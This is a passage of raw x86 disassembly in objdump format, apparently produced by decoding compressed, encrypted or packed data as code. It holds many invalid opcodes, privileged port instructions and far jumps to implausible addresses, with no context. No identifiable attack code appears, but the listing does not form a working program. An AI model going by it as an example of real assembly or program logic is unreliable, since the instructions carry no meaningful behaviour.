  40d0f7:	mov    dh,0x9d
  40d0f9:	xchg   ebx,eax
  40d0fa:	dec    esi
  40d0fb:	jmp    0x6b25:0x3c881672
  40d102:	(bad)  
  40d103:	fcom   DWORD PTR [esi+0x9]
  40d106:	push   ebx
  40d107:	jle    0x40d0ca
  40d109:	je     0x40d0c8
  40d10b:	push   ebp
  40d10c:	inc    edx
  40d10d:	sbb    al,0xeb
  40d10f:	pop    edi
  40d110:	mov    bh,0x7d
  40d112:	ret    0x8b83
  40d115:	fiadd  WORD PTR [ecx]
  40d117:	jg     0x40d167
  40d119:	pop    ebx
  40d11a:	mov    dl,0x5
  40d11c:	ret    0xb5cd
  40d11f:	fld    DWORD PTR [ebx]
  40d121:	inc    edx
  40d122:	or     al,0x68
  40d124:	lahf   
  40d125:	das    
  40d126:	xchg   ebp,eax
  40d127:	rol    DWORD PTR [edi-0x61],1
  40d12a:	out    dx,al
  40d12b:	loopne 0x40d111
  40d12d:	and    dl,BYTE PTR [ebx]
  40d12f:	sbb    eax,0x8af67253
  40d134:	stos   DWORD PTR es:[edi],eax
  40d135:	sub    dl,bh
  40d137:	xchg   ah,ah
  40d139:	imul   ecx,DWORD PTR [eax+0x7b],0xa5b72ccf
  40d140:	dec    eax
  40d141:	sbb    edx,esp
  40d143:	sbb    BYTE PTR [ecx-0x56b44fd1],0xf5
  40d14a:	xchg   dl,ah
  40d14c:	cmc    
  40d14d:	(bad)  
  40d14e:	push   eax
  40d14f:	xchg   ecx,eax
  40d150:	call   DWORD PTR [eax+eax*8+0x7c]
  40d154:	add    ebp,DWORD PTR [esi-0x70472da8]
  40d15a:	das    
  40d15b:	nop
  40d15c:	stc    
  40d15d:	xor    BYTE PTR [ebp-0x7a],0x45
  40d161:	sti    
  40d162:	int3   
  40d163:	aas    
  40d164:	push   es
  40d165:	jmp    0x6961:0x8ac7315c
  40d16c:	pop    edx
  40d16d:	shl    BYTE PTR [ecx],1
  40d16f:	cmp    al,0xed
  40d171:	xchg   ebx,eax
  40d172:	xchg   ebp,eax
  40d173:	fs int 0x77
  40d176:	ins    DWORD PTR es:[edi],dx
  40d177:	repnz inc ecx
  40d179:	xlat   BYTE PTR ds:[ebx]
  40d17a:	sub    DWORD PTR [ebp-0x7668d8d6],edi
  40d180:	mov    gs,WORD PTR [esi-0x3e]
  40d183:	inc    esp
  40d184:	mov    al,ds:0x55692aec
  40d189:	lds    edi,FWORD PTR [ebx]
  40d18b:	cmp    ebp,edx
  40d18d:	ror    BYTE PTR [edx-0x47],1
  40d190:	(bad)  
  40d191:	jmp    0xcf8f:0x72cc20e8
  40d198:	or     dh,BYTE PTR [esi+0x2f]
  40d19b:	setg   BYTE PTR [ecx]
  40d19e:	scas   al,BYTE PTR es:[edi]
  40d19f:	sub    bl,ah
  40d1a1:	cmp    esp,ecx
  40d1a3:	pusha  
  40d1a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1a5:	scas   eax,DWORD PTR es:[edi]
  40d1a6:	mov    al,ds:0x62acf8f7
  40d1ab:	mov    ecx,DWORD PTR [esi-0x14410038]
  40d1b1:	retf   
  40d1b2:	pop    esi
  40d1b3:	lods   eax,DWORD PTR ds:[esi]
  40d1b4:	stos   BYTE PTR es:[edi],al
  40d1b5:	mov    al,ds:0x3c5b67cf
  40d1ba:	inc    ebx
  40d1bb:	inc    edi
  40d1bc:	dec    esp
  40d1bd:	mov    eax,0x80cae444
  40d1c2:	jl     0x40d154
  40d1c4:	popa   
  40d1c5:	loopne 0x40d22d
  40d1c7:	fld    TBYTE PTR [ebp-0x4a]
  40d1ca:	sti    
  40d1cb:	or     DWORD PTR [esi],eax
  40d1cd:	mov    dl,0x22
  40d1cf:	mov    ds:0x16e164d7,eax
  40d1d4:	shl    esp,1
  40d1d6:	(bad)  
  40d1d8:	nop
  40d1d9:	aas    
  40d1da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1db:	shl    DWORD PTR [ebx+esi*8-0x64],0x59
  40d1e0:	fdivr  QWORD PTR [edi+0x3c7d8040]
  40d1e6:	and    eax,0xec3b1f56
  40d1eb:	jns    0x40d1e6
  40d1ed:	xchg   ecx,eax
  40d1ee:	and    esp,esi
  40d1f0:	stos   BYTE PTR es:[edi],al
  40d1f1:	jmp    FWORD PTR [ebx+0x629fc74e]
  40d1f7:	sbb    eax,0x1bd97878
  40d1fc:	cmp    BYTE PTR [edi+0x4f],ah
  40d1ff:	outs   dx,DWORD PTR ds:[esi]
  40d200:	push   ebx
  40d201:	mov    edi,0x568f4bf6
  40d206:	xchg   edx,eax
  40d207:	cmp    al,0x61
  40d209:	pop    ebx
  40d20a:	fwait
  40d20b:	in     al,dx
  40d20c:	loop   0x40d18f
  40d20e:	mov    cl,0x7e
  40d210:	jbe    0x40d1bc
  40d212:	icebp  
  40d213:	push   eax
  40d214:	xor    ah,BYTE PTR [esi]
  40d216:	dec    esi
  40d217:	into   
  40d218:	push   cs
  40d219:	lock pop esi
  40d21b:	and    al,0x5e
  40d21d:	mov    dh,0xa4
  40d21f:	loop   0x40d224
  40d221:	jo     0x40d281
  40d223:	(bad)  
  40d224:	adc    DWORD PTR ds:[esi+0x7bf1fea8],edi
  40d22b:	shl    BYTE PTR [eax],1
  40d22d:	jge    0x40d255
  40d22f:	or     ebp,DWORD PTR [edx-0x2f915d5d]
  40d235:	(bad)  
  40d236:	out    dx,eax
  40d237:	imul   edx,edx,0xd3f602b
  40d23d:	pop    edi
  40d23e:	inc    eax
  40d23f:	adc    al,BYTE PTR [ebx+eiz*1-0x4dcadc9b]
  40d246:	xbegin 0x622a2a66
  40d24c:	mov    edi,0x25fc261b
  40d251:	shr    ebx,cl
  40d253:	bound  edi,QWORD PTR [ebx-0x4e]
  40d256:	rcr    BYTE PTR [ebp-0x4367c256],1
  40d25c:	jl     0x40d2ce
  40d25e:	cmp    ebp,DWORD PTR [ebp-0x3f]
  40d261:	inc    ecx
  40d262:	cmp    eax,0x574b2a7b
  40d267:	inc    ecx
  40d268:	mov    ebx,0xe3c570e1
  40d26d:	and    DWORD PTR [ebp+edi*1-0x3f],0x67ee46b9
  40d275:	arpl   WORD PTR [edx],si
  40d277:	and    BYTE PTR [esi],bl
  40d279:	addr16 mov dh,0x6a
  40d27c:	mov    eax,db5
  40d27f:	clc    
  40d280:	xlat   BYTE PTR ds:[ebx]
  40d281:	dec    edi
  40d282:	fmul   DWORD PTR [eax+0x61]
  40d285:	shr    DWORD PTR ds:0x172bd238,cl
  40d28b:	lods   al,BYTE PTR ds:[esi]
  40d28c:	sti    
  40d28d:	rcl    DWORD PTR [edi],cl
  40d28f:	sub    BYTE PTR [eax-0x5d],ch
  40d292:	and    ebp,0xffffffab
  40d295:	sub    al,0xe1
  40d297:	leave  
  40d298:	xlat   BYTE PTR ds:[ebx]
  40d299:	inc    edx
  40d29a:	adc    al,0x23
  40d29c:	push   esi
  40d29d:	pop    es
  40d29e:	cmc    
  40d29f:	repnz mov al,0x1a
  40d2a2:	push   edx
  40d2a3:	hlt    
  40d2a4:	test   BYTE PTR [ebx-0x201c9488],ch
  40d2aa:	jg     0x40d2b1
  40d2ac:	outs   dx,DWORD PTR ds:[esi]
  40d2ad:	sub    DWORD PTR [eax-0x7d],edi
  40d2b0:	xor    al,0x24
  40d2b2:	or     edi,DWORD PTR [ebx]
  40d2b4:	push   0xffffff81
  40d2b6:	ja     0x40d275
  40d2b8:	aam    0x20
  40d2ba:	or     eax,0x6c92ff54
  40d2bf:	in     eax,dx
  40d2c0:	data16 jno 0x40d281
  40d2c3:	push   0x9228a27d
  40d2c8:	loop   0x40d33d
  40d2ca:	push   es
  40d2cb:	out    0x70,eax
  40d2cd:	pop    ss
  40d2ce:	repz (bad) 
  40d2d0:	mov    dl,0x64
  40d2d2:	(bad)
  40d2d5:	adc    ch,BYTE PTR [ebp+0x5783b5e9]
  40d2db:	loop   0x40d281
  40d2dd:	cmp    BYTE PTR [ecx],0xec
  40d2e0:	into   
  40d2e1:	mov    ds:0x5c6a41df,al
  40d2e6:	dec    ebx
  40d2e7:	in     eax,dx
  40d2e8:	fstp   DWORD PTR [esi+0x3a16ed86]
  40d2ee:	jo     0x40d28d
  40d2f0:	call   FWORD PTR [ebx+esi*4]
  40d2f3:	rcr    DWORD PTR ds:0xeafc27b,0x84
  40d2fa:	mov    bl,0xbe
  40d2fc:	and    al,0xfd
  40d2fe:	ficom  DWORD PTR [ecx+eax*1-0x1a82841d]
  40d305:	pushf  
  40d306:	xor    edx,edx
  40d308:	imul   esp,DWORD PTR [ebx],0xffffffdc
  40d30b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d30c:	inc    ebx
  40d30d:	push   0x2c
  40d30f:	in     al,dx
  40d310:	push   esi
  40d311:	inc    ebp
  40d312:	leave  
  40d313:	adc    al,0xbf
  40d315:	clc    
  40d316:	lahf   
  40d317:	xlat   BYTE PTR ds:[ebx]
  40d318:	out    0xa2,eax
  40d31a:	(bad)  
  40d31b:	in     al,0x43
  40d31d:	inc    ebx
  40d31e:	push   esp
  40d31f:	add    eax,0xdcb7dea2
  40d324:	sbb    DWORD PTR [ecx],ecx
  40d326:	lock pop edi
  40d328:	in     al,0x7a
  40d32a:	rcr    dh,cl
  40d32c:	data16 sbb al,0x39
  40d32f:	outs   dx,BYTE PTR ds:[esi]
  40d330:	stos   DWORD PTR es:[edi],eax
  40d331:	mov    edi,0x625acee8
  40d336:	repnz sbb al,0x5b
  40d339:	push   ss
  40d33a:	inc    ebx
  40d33b:	(bad)
  40d33e:	cli    
  40d33f:	xor    esi,DWORD PTR ds:0x6d9f247b
  40d345:	xor    al,0x71
  40d347:	sbb    DWORD PTR [ebx+0x4],0x8
  40d34b:	inc    ebp
  40d34c:	sub    eax,0xb289624e
  40d351:	push   cs
  40d352:	mov    eax,0x2a417fe3
  40d357:	xor    ah,BYTE PTR [ebx-0x7366c69c]
  40d35d:	imul   edx,ecx,0x205a5e2c
  40d363:	push   esi
  40d364:	call   0xd95a1a3b
  40d369:	sbb    esi,ebp
  40d36b:	mov    bh,0xd2
  40d36d:	cmc    
  40d36e:	test   al,0x38
  40d370:	icebp  
  40d371:	adc    al,BYTE PTR [edx+0x49]
  40d374:	cmp    DWORD PTR [ebx-0x7f],ebx
  40d377:	add    ch,BYTE PTR [eax-0x1b96db99]
  40d37d:	xchg   edx,eax
  40d37e:	mov    WORD PTR [ebx+0x1ace95c0],gs
  40d384:	adc    DWORD PTR [eax],esi
  40d386:	and    al,BYTE PTR [edx]
  40d388:	jmp    FWORD PTR [ebp+0x20e57e16]
  40d38e:	pushf  
  40d38f:	out    0x8f,eax
  40d391:	mov    bl,0xe4
  40d393:	sar    DWORD PTR [ebp+edi*4+0x20],0x43
  40d398:	push   edi
  40d399:	loopne 0x40d327
  40d39b:	inc    ebp
  40d39c:	aas    
  40d39d:	mov    dh,0xab
  40d39f:	mov    esi,0xc37137f6
  40d3a4:	push   edi
  40d3a5:	jmp    0x4e718dcd
  40d3aa:	dec    esp
  40d3ab:	pop    eax
  40d3ac:	int3   
  40d3ad:	inc    ecx
  40d3ae:	cmp    DWORD PTR [eax-0x7bd34059],0xdc8b29ec
  40d3b8:	or     eax,0x3407b5bd
  40d3bd:	mov    ebx,0xf0748653
  40d3c2:	inc    esi
  40d3c3:	fisub  DWORD PTR [edx]
  40d3c5:	sub    BYTE PTR [edi+0x7b],al
  40d3c8:	pop    ebp
  40d3c9:	add    cl,BYTE PTR [esi]
  40d3cb:	daa    
  40d3cc:	add    eax,0xf98899af
  40d3d1:	outs   dx,DWORD PTR ds:[esi]
  40d3d2:	jmp    0x40d379
  40d3d4:	pop    ecx
  40d3d5:	jno    0x40d456
  40d3d7:	and    BYTE PTR gs:[ecx],bl
  40d3da:	out    dx,al
  40d3db:	cmc    
  40d3dc:	jns    0x40d3fc
  40d3de:	mov    ch,0x2b
  40d3e0:	into   
  40d3e1:	adc    eax,0xe4f905e5
  40d3e6:	pop    ebp
  40d3e7:	push   esi
  40d3e8:	jecxz  0x40d3f4
  40d3ea:	jno    0x40d436
  40d3ec:	test   DWORD PTR [esi-0x614b5408],ebx
  40d3f2:	popa   
  40d3f3:	in     eax,dx
  40d3f4:	jmp    0x40d3d4
  40d3f6:	mov    dl,0x7c
  40d3f8:	icebp  
  40d3f9:	mov    ds:0x7ab6dceb,eax
  40d3fe:	or     dh,ch
  40d400:	push   ss
  40d401:	(bad)  
  40d402:	fdivr  DWORD PTR [eax+eax*2]
  40d405:	stos   DWORD PTR es:[edi],eax
  40d406:	xchg   edx,eax
  40d407:	sbb    BYTE PTR [ecx-0x7e0b82c5],0x6c
  40d40e:	(bad)  
  40d40f:	shl    ecx,cl
  40d411:	cmp    DWORD PTR [ebp-0x15],edi
  40d414:	sub    DWORD PTR [edi],0x3c
  40d417:	inc    ecx
  40d418:	mov    ecx,0x833f7c82
  40d41d:	stos   BYTE PTR es:[edi],al
  40d41e:	sahf   
  40d41f:	(bad)  
  40d420:	jbe    0x40d3a7
  40d422:	inc    eax
  40d423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d424:	mov    ebp,0xae0d5089
  40d429:	inc    edi
  40d42a:	push   ebx
  40d42b:	push   0x71
  40d42d:	jbe    0x40d3bf
  40d42f:	imul   DWORD PTR gs:[ebx-0x5a]
  40d433:	ds xchg edx,eax
  40d435:	call   0x6d68:0x5d62c65d
  40d43c:	lods   eax,DWORD PTR ds:[esi]
  40d43d:	pop    esp
  40d43e:	out    0x95,al
  40d440:	test   al,0x9f
  40d442:	inc    esp
  40d443:	dec    edi
  40d444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d445:	jle    0x40d448
  40d447:	and    BYTE PTR [ecx-0x42],bh
  40d44a:	icebp  
  40d44b:	stc    
  40d44c:	inc    eax
  40d44d:	adc    eax,DWORD PTR [ebx+eiz*4+0x4a]
  40d451:	dec    edx
  40d452:	xchg   ebx,eax
  40d453:	dec    esp
  40d454:	pop    esi
  40d455:	push   es
  40d456:	(bad)  
  40d457:	outs   dx,BYTE PTR ds:[esi]
  40d458:	push   cs
  40d459:	pop    ebx
  40d45a:	sub    eax,0x33bb0a5b
  40d45f:	mov    edx,0xb55e2fab
  40d464:	int3   
  40d465:	movhlps xmm3,xmm3
  40d468:	adc    dh,BYTE PTR [eax-0x4dab54d2]
  40d46e:	adc    BYTE PTR [eax+esi*1+0x61dd9c64],dl
  40d475:	fstp   TBYTE PTR [ebp-0x44]
  40d478:	inc    esi
  40d479:	push   esi
  40d47a:	inc    ebp
  40d47b:	pop    esi
  40d47c:	mov    bh,0x88
  40d47e:	mov    eax,0xa2a74f92
  40d483:	jg     0x40d459
  40d485:	test   eax,0x66a6632e
  40d48a:	je     0x40d4e1
  40d48c:	or     al,0x44
  40d48e:	sub    edi,esp
  40d490:	jl     0x40d4db
  40d492:	iret   
  40d493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d494:	aas    
  40d495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d496:	enter  0x7912,0x79
  40d49a:	or     al,al
  40d49c:	and    dh,BYTE PTR [edi+0x69]
  40d49f:	push   ds
  40d4a0:	adc    esi,esp
  40d4a2:	push   cs
  40d4a3:	xchg   esp,eax
  40d4a4:	mov    ecx,0xc4c9d262
  40d4a9:	cld    
  40d4aa:	xchg   ebx,eax
  40d4ab:	or     BYTE PTR [edi],cl
  40d4ad:	xlat   BYTE PTR ds:[ebx]
  40d4ae:	iret   
  40d4af:	sbb    al,0xa
  40d4b1:	jp     0x40d52b
  40d4b3:	fs inc esi
  40d4b5:	add    al,0x74
  40d4b7:	jecxz  0x40d4cb
  40d4b9:	aad    0xd3
  40d4bb:	sub    ch,al
  40d4bd:	es sbb bh,bh
  40d4c0:	aad    0x65
  40d4c2:	mov    ss,WORD PTR [ecx]
  40d4c4:	mov    ebx,0xadc1f8c
  40d4c9:	outs   dx,BYTE PTR ds:[esi]
  40d4ca:	mov    bl,0x9d
  40d4cc:	or     eax,0x6651fd96
  40d4d1:	push   0x61
  40d4d3:	mov    ebx,0xcef6e180
  40d4d8:	or     ch,BYTE PTR [esi+0xe]
  40d4db:	mov    ds:0x70af98de,eax
  40d4e0:	and    DWORD PTR [esi],esi
  40d4e2:	push   ebx
  40d4e3:	inc    esp
  40d4e4:	push   esi
  40d4e5:	push   ebp
  40d4e6:	stc    
  40d4e7:	test   al,0x5c
  40d4e9:	xchg   edi,eax
  40d4ea:	add    eax,edi
  40d4ec:	cmp    ebx,DWORD PTR [esi+ebx*4]
  40d4ef:	(bad)  
  40d4f0:	cmc    
  40d4f1:	jmp    0x37cbe8e4
  40d4f6:	popa   
  40d4f7:	out    dx,eax
  40d4f8:	sub    eax,0xc00faf9b
  40d4fd:	out    0x91,eax
  40d4ff:	adc    eax,0x44900199
  40d504:	jl     0x40d4da
  40d506:	pusha  
  40d507:	sahf   
  40d508:	adc    eax,0x972bec71
  40d50d:	cmp    al,0x64
  40d50f:	ins    DWORD PTR es:[edi],dx
  40d510:	into   
  40d511:	dec    ecx
  40d512:	ret    
  40d513:	jns    0x40d555
  40d515:	jno    0x40d560
  40d517:	cmp    al,0xf2
  40d519:	inc    edi
  40d51a:	repz sbb edx,DWORD PTR [esi]
  40d51d:	imul   esp,esi,0xffffffa9
  40d520:	scas   eax,DWORD PTR es:[edi]
  40d521:	xor    esp,ecx
  40d523:	sub    eax,0x5fc4540d
  40d528:	(bad)  
  40d529:	shr    BYTE PTR [ebx],cl
  40d52b:	dec    edx
  40d52c:	inc    edi
  40d52d:	add    ebp,esp
  40d52f:	dec    esi
  40d530:	inc    eax
  40d531:	mov    esp,0xfc9dbad
  40d536:	sub    eax,0xbe3ffa1b
  40d53b:	mov    dl,0x27
  40d53d:	int3   
  40d53e:	xchg   edi,eax
  40d53f:	fld    TBYTE PTR [ebx-0x777f8c25]
  40d545:	mov    eax,0x1f5fc756
  40d54a:	push   ds
  40d54b:	xor    ecx,DWORD PTR [ecx]
  40d54d:	hlt    
  40d54e:	xor    bl,BYTE PTR [ebp+edi*8+0x45]
  40d552:	cli    
  40d553:	xchg   BYTE PTR ds:0x775818bd,bl
  40d559:	and    eax,0x2060ac0d
  40d55e:	bound  esp,QWORD PTR [esi-0x4476ac]
  40d564:	or     DWORD PTR [edi-0x1e00a347],ebx
  40d56a:	jae    0x40d598
  40d56c:	cmp    DWORD PTR [esi+0x62],esi
  40d56f:	and    bh,al
  40d571:	mov    dh,0xa0
  40d573:	pop    ebx
  40d574:	adc    al,0x9a
  40d576:	xor    DWORD PTR [edi+0x53],ecx
  40d579:	fwait
  40d57a:	mov    WORD PTR [ebx+0x5c],fs
  40d57d:	pop    es
  40d57e:	and    bl,BYTE PTR [esp+esi*4-0x74]
  40d582:	addr16 xor al,0x52
  40d585:	jno    0x40d555
  40d587:	sub    ebp,edi
  40d589:	or     al,cl
  40d58b:	jl     0x40d51f
  40d58d:	add    BYTE PTR [esi+0x46171133],cl
  40d593:	mov    esp,DWORD PTR [esi-0x7e10aaf]
  40d599:	cmp    al,0x15
  40d59b:	jb     0x40d60b
  40d59d:	ss into 
  40d59f:	ret    
  40d5a0:	lods   eax,DWORD PTR ds:[esi]
  40d5a1:	sti    
  40d5a2:	or     DWORD PTR [edx+0x34],esi
  40d5a5:	adc    al,0x45
  40d5a7:	dec    ebx
  40d5a8:	pop    edi
  40d5a9:	or     BYTE PTR [ebx+0x32],bh
  40d5ac:	sbb    edi,eax
  40d5ae:	mov    bh,0xe1
  40d5b0:	retf   0xbd8d
  40d5b3:	lods   eax,DWORD PTR ds:[esi]
  40d5b4:	jno    0x40d614
  40d5b6:	enter  0x1e94,0xa5
  40d5ba:	xchg   ecx,eax
  40d5bb:	xchg   esp,eax
  40d5bc:	repnz das 
  40d5be:	jns    0x40d636
  40d5c0:	mov    bl,0xc8
  40d5c2:	pushf  
  40d5c3:	inc    edi
  40d5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5c5:	pop    ecx
  40d5c6:	dec    ebx
  40d5c7:	(bad)  
  40d5c8:	mov    dh,0x37
  40d5ca:	cli    
  40d5cb:	repz or cl,BYTE PTR [esi+0x51c86b6e]
  40d5d2:	jnp    0x40d5b4
  40d5d4:	xor    eax,0xc970c36
  40d5d9:	data16 fcmovne st,st(6)
  40d5dc:	jo     0x40d61c
  40d5de:	int3   
  40d5df:	jle    0x40d5d6
  40d5e1:	pushf  
  40d5e2:	pop    edi
  40d5e3:	aam    0xe4
  40d5e5:	adc    BYTE PTR [edx],dh
  40d5e7:	mov    ?,WORD PTR [esi+ecx*8-0x6f71a397]
  40d5ee:	scas   al,BYTE PTR es:[edi]
  40d5ef:	cmp    DWORD PTR [edi+0x7f],edx
  40d5f2:	out    dx,al
  40d5f3:	dec    edx
  40d5f4:	jp     0x40d57d
  40d5f6:	push   edi
  40d5f7:	xlat   BYTE PTR ds:[ebx]
  40d5f8:	mov    dl,0x3d
  40d5fa:	or     ch,ah
  40d5fc:	adc    esi,DWORD PTR [ebp-0x1c]
  40d5ff:	pusha  
  40d600:	loope  0x40d5af
  40d602:	push   ebp
  40d603:	fs inc ecx
  40d605:	mov    bh,BYTE PTR [ecx-0x28]
  40d608:	add    ch,al
  40d60a:	xor    dl,bh
  40d60c:	(bad)  
  40d60d:	cs cli 
  40d60f:	xchg   DWORD PTR [ebp-0x80],eax
  40d612:	mov    ecx,0x61765ccd
  40d617:	and    edx,DWORD PTR [edi+ebp*4+0x53831536]
  40d61e:	mov    bl,0xc4
  40d620:	adc    edi,ebp
  40d622:	add    bl,BYTE PTR [edx-0x33]
  40d625:	(bad)  
  40d626:	in     al,dx
  40d627:	xor    eax,0x310bfc4d
  40d62c:	dec    bp
  40d62e:	ret    0x9c21
  40d631:	out    dx,al
  40d632:	fwait
  40d633:	rcl    BYTE PTR [esi],1
  40d635:	test   al,0x9d
  40d637:	cmp    ebp,DWORD PTR [ecx-0x8]
  40d63a:	xchg   BYTE PTR [ecx-0x67],cl
  40d63d:	test   al,0xa3
  40d63f:	leave  
  40d640:	sar    eax,0x47
  40d643:	in     al,0x6
  40d645:	sub    DWORD PTR [esi],esi
  40d647:	inc    ecx
  40d648:	sbb    al,0x80
  40d64a:	daa    
  40d64b:	add    BYTE PTR [ecx-0x65f83229],cl
  40d651:	sub    BYTE PTR [esi],bl
  40d653:	xor    edi,DWORD PTR [edx]
  40d655:	data16 cmp BYTE PTR [edi-0x3d72d24b],bh
  40d65c:	pop    ebx
  40d65d:	xchg   edx,eax
  40d65e:	sbb    ecx,edi
  40d660:	aas    
  40d661:	ja     0x40d677
  40d663:	and    al,0xc6
  40d665:	loope  0x40d6bc
  40d667:	popf   
  40d668:	call   0x29cf:0xf4c2ca9e
  40d66f:	inc    edx
  40d670:	lea    ebx,[ecx+0x196d81e]
  40d676:	jg     0x40d605
  40d678:	jl     0x40d6bd
  40d67a:	shl    BYTE PTR [ecx+0x6b70da01],cl
  40d680:	xchg   ebx,eax
  40d681:	push   esi
  40d682:	call   0x3780e9b6
  40d687:	ror    DWORD PTR [esi],cl
  40d689:	mov    edi,0xb61dcd86
  40d68e:	sti    
  40d68f:	cli    
  40d690:	mov    dh,0xa6
  40d692:	add    al,0x43
  40d694:	cdq    
  40d695:	shr    edi,cl
  40d697:	push   cs
  40d698:	out    dx,eax
  40d699:	push   es
  40d69a:	push   0x17
  40d69c:	es push ss
  40d69e:	sub    ch,al
  40d6a0:	int3   
  40d6a1:	and    dh,dh
  40d6a3:	in     eax,0x4c
  40d6a5:	and    DWORD PTR [esi],edi
  40d6a7:	sar    BYTE PTR [eax],1
  40d6a9:	xchg   BYTE PTR [ecx],dh
  40d6ab:	out    0xfc,al
  40d6ad:	mov    ebx,0x5aee6337
  40d6b2:	loop   0x40d6c0
  40d6b4:	and    al,0x3e
  40d6b6:	xor    bh,bh
  40d6b8:	dec    ecx
  40d6b9:	inc    ebp
  40d6ba:	shr    DWORD PTR [ebp+0x2c487314],0xe2
  40d6c1:	mov    esp,0xb16b0dfe
  40d6c6:	in     eax,0x27
  40d6c8:	push   cs
  40d6c9:	push   ds
  40d6ca:	xchg   esi,eax
  40d6cb:	and    eax,0x1428298c
  40d6d0:	xor    ebx,DWORD PTR [edx+0x7c]
  40d6d3:	outs   dx,DWORD PTR ds:[esi]
  40d6d4:	fistp  QWORD PTR [esi]
  40d6d6:	sub    DWORD PTR [edx-0x19a67732],esp
  40d6dc:	dec    edi
  40d6dd:	stos   BYTE PTR es:[edi],al
  40d6de:	les    esi,FWORD PTR [edx-0x4378c12f]
  40d6e4:	xor    DWORD PTR [esi-0x7a30e0ed],edx
  40d6ea:	pushf  
  40d6eb:	shl    BYTE PTR [esi+ebx*2-0x3a],1
  40d6ef:	in     eax,0x12
  40d6f1:	nop
  40d6f2:	cmp    al,BYTE PTR [eax]
  40d6f4:	loope  0x40d69b
  40d6f6:	xchg   edi,eax
  40d6f7:	dec    edi
  40d6f8:	repz adc BYTE PTR ds:0x3f75a7a2,ch
  40d6ff:	aad    0xf1
  40d701:	daa    
  40d702:	push   eax
  40d703:	lea    edi,[ecx+0x55e32705]
  40d709:	inc    ebp
  40d70a:	scas   eax,DWORD PTR es:[edi]
  40d70b:	mov    dl,0x72
  40d70d:	push   es
  40d70e:	fnsave [eax+0x13]
  40d711:	mov    bl,0x17
  40d713:	and    eax,0xe6886c62
  40d718:	loop   0x40d731
  40d71a:	mov    ebx,edi
  40d71c:	aam    0x51
  40d71e:	ficomp DWORD PTR [edx-0x5b]
  40d721:	icebp  
  40d722:	or     cl,BYTE PTR [eax]
  40d724:	dec    eax
  40d725:	aas    
  40d726:	adc    BYTE PTR [ebp+0x6bbd5696],dh
  40d72c:	test   BYTE PTR [edx-0x26],dl
  40d72f:	jmp    0x4302:0xfaf0897d
  40d736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d737:	pop    edx
  40d738:	sbb    eax,0x32b45a50
  40d73d:	ds mov edi,0x9f96263d
  40d744:	data16 stc 
  40d746:	outs   dx,DWORD PTR ds:[esi]
  40d747:	push   es
  40d748:	jmp    ecx
  40d74a:	retf   0xa661
  40d74d:	ret    
  40d74e:	(bad)  
  40d74f:	push   ecx
  40d750:	nop
  40d751:	(bad)  
  40d752:	hlt    
  40d753:	inc    ebp
  40d754:	mov    edx,0x4490a572
  40d759:	pop    ss
  40d75a:	lea    ebx,[ecx+0x772df6de]
  40d760:	sahf   
  40d761:	sub    al,0x78
  40d763:	mov    esi,0x19a3d677
  40d768:	ins    BYTE PTR es:[edi],dx
  40d769:	xchg   ebx,eax
  40d76a:	push   ebx
  40d76b:	dec    BYTE PTR [edi]
  40d76d:	(bad)  
  40d76f:	stos   BYTE PTR es:[edi],al
  40d770:	push   0x24a1b004
  40d775:	pop    edx
  40d776:	xor    al,0x4b
  40d778:	(bad)  
  40d77a:	ins    BYTE PTR es:[edi],dx
  40d77b:	call   0xc94a2ac4
  40d780:	out    0xbd,al
  40d782:	dec    ebx
  40d783:	les    eax,FWORD PTR [ecx]
  40d785:	xor    eax,0xc8cf8a
  40d78a:	pushf  
  40d78b:	out    dx,al
  40d78c:	shl    BYTE PTR [eax],cl
  40d78e:	adc    al,0xba
  40d790:	xchg   BYTE PTR [ebx+0x108b2768],bl
  40d796:	pop    ss
  40d797:	add    DWORD PTR [edi+0x2b],esp
  40d79a:	lahf   
  40d79b:	push   ebp
  40d79c:	mov    ebp,0x959f292a
  40d7a1:	jne    0x40d79e
  40d7a3:	cs push esp
  40d7a5:	xchg   BYTE PTR [ecx],bh
  40d7a7:	ja     0x40d732
  40d7a9:	ret    
  40d7aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7ab:	cmp    DWORD PTR [eax+0xfe364aa],esp
  40d7b1:	in     eax,0x2
  40d7b3:	into   
  40d7b4:	bound  esi,QWORD PTR [edx]
  40d7b6:	xchg   esp,eax
  40d7b7:	std    
  40d7b8:	outs   dx,DWORD PTR ds:[esi]
  40d7b9:	sbb    DWORD PTR [esi-0x1f],ebx
  40d7bc:	xchg   DWORD PTR [edx],ebp
  40d7be:	cdq    
  40d7bf:	pop    ds
  40d7c0:	xchg   edi,eax
  40d7c1:	sbb    esp,DWORD PTR [esi+0x64]
  40d7c4:	mov    BYTE PTR [ecx+0x9],al
  40d7c7:	or     ch,BYTE PTR ds:0xcc2535d9
  40d7cd:	mov    dl,0x7d
  40d7cf:	rcl    DWORD PTR [eax],0xe1
  40d7d2:	or     ecx,DWORD PTR [edx+0x13]
  40d7d5:	xlat   BYTE PTR ds:[ebx]
  40d7d6:	fiadd  WORD PTR [edx+edi*1]
  40d7d9:	out    0xce,al
  40d7db:	xchg   edi,edx
  40d7dd:	pop    edi
  40d7de:	push   ebx
  40d7df:	das    
  40d7e0:	int3   
  40d7e1:	inc    edi
  40d7e2:	out    0xa3,eax
  40d7e4:	add    eax,0x76137a88
  40d7e9:	(bad)  
  40d7ea:	jg     0x40d7c4
  40d7ec:	or     ecx,ebx
  40d7ee:	or     esp,ecx
  40d7f0:	es std 
  40d7f2:	xor    esp,DWORD PTR [edi]
  40d7f4:	ins    DWORD PTR es:[edi],dx
  40d7f5:	repz dec ebp
  40d7f7:	adc    dl,ah
  40d7f9:	imul   ebp,DWORD PTR [edx],0x58
  40d7fc:	in     eax,dx
  40d7fd:	in     al,0x92
  40d7ff:	xchg   ebx,eax
  40d800:	fsub   st,st(6)
  40d802:	mov    DWORD PTR [eax+0x23da1c18],edi
  40d808:	xor    eax,esp
  40d80a:	lds    esi,FWORD PTR [esi]
  40d80c:	sti    
  40d80d:	ins    BYTE PTR es:[edi],dx
  40d80e:	dec    ebx
